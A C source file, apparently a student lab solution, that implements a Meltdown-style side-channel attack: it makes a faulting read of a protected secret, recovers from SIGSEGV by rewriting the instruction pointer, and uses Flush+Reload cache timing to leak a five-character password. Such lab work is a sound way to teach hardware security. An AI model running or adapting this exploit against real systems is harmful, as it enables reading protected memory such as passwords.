#include "recover_protected_local_secret.h"

#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define __USE_GNU
#include <signal.h>

#include "util.h"

extern uint8_t label[];

const size_t MIN_CHOICE = 'A' - 1;
const size_t MAX_CHOICE = 'Z' + 1;
const size_t SECRET_LENGTH = 5;

// Initialize the pages
static inline page_t *init_pages(void) {
    page_t *pages = calloc(UINT8_MAX + 1, PAGE_SIZE);
    assert(pages != NULL);
    return pages;
}

// Flushes all the pages
static inline void flush_all_pages(page_t *pages) {
    for (size_t i = MIN_CHOICE; i <= MAX_CHOICE; i++) {
        flush_cache_line(&pages[i]);
    }
}

// Guesses the accessed page
static inline size_t guess_accessed_page(page_t *pages) {
    for (size_t i = MIN_CHOICE; i <= MAX_CHOICE; i++) {
        if ((time_read(&pages[i]) < 260) && (time_read(&pages[i]) < 260)) {
            return i;
        }
    }
    return 0;
}

// Force-reads the pages corresponding to the secret index
static inline void do_access(page_t *pages, size_t secret_index) {
    cache_secret();
    force_read(pages[access_secret(secret_index)]);
}

// Implements the SIGSEGV handler from the lecture notes
static void sigfpe_handler(int signum, siginfo_t *siginfo, void *context) {
    ucontext_t *ucontext = (ucontext_t *) context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t) label;
    (void) siginfo;
    (void) signum;
}

// Driver code
int main() {
    // Implements the SIGSEGV caller
    struct sigaction act = {.sa_sigaction = sigfpe_handler, .sa_flags = SA_SIGINFO};
    sigaction(SIGSEGV, &act, NULL);

    page_t *pages = init_pages();

    // Finds the 5 characters of the password
    for (size_t i = 0; i < SECRET_LENGTH; i++) {
        bool flag = true;
        // Keeps searching for an acceptable character
        while (flag == true) {
            flush_all_pages(pages);
            do_access(pages, i);
            asm volatile("label:");
            size_t guess = guess_accessed_page(pages);
            if ((guess > MIN_CHOICE) && (guess < MAX_CHOICE)) {
                printf("%c", (char) guess);
                fflush(stdout);
                flag = false;
            }
        }
    }
    printf("\n");
    free(pages);
}
